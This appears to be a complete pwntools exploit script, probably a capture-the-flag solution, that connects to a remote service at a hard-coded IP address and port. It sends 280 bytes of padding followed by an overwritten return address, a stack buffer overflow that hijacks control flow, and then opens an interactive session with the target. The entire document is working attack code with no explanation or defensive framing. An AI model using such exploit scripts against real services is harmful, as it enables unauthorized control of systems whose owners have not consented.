from pwn import *
p = remote("103.229.41.18", 5557)
padding = b"a" * 280
ret = p64(0x4011b6)
payload = padding + ret
p.sendline(payload)
p.interactive()

